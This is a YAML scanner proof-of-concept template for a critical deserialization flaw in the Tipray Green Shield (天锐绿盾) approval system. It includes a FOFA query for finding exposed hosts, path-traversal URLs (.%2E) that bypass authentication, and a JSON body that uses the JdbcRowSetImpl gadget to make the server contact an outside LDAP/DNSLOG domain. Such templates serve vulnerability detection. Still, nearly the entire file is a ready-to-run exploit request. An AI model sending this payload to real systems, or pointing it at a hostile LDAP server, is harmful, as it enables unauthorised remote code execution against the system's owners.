id: poc-yaml-tipray-gsas-template-deserialize
info:
  name: 天锐绿盾审批系统 template 反序列化漏洞
  severity: critical
  tags:
  - 反序列化
  - DNSLOG
  finger: 天锐绿盾审批系统
  fofa: app="TIPPAY-绿盾审批系统"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
  paths: 'trwfe/service/.%2E/rest/ext/template

    trwfe/login.jsp/.%2e/rest/ext/template

    '
requests:
- method: POST
  path: /{{.paths}}
  headers:
    Content-Type: application/json
  data: "{\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\"\
    : \"ldap://{{.domain}}\",\n    \"autoCommit\": true\n}"
  expression: status_code == 500 && contains(body,"Internal server error") && contains(body,"set
    property error") && contains(content_type,"application/json") && reverse.Verify()
transport: http
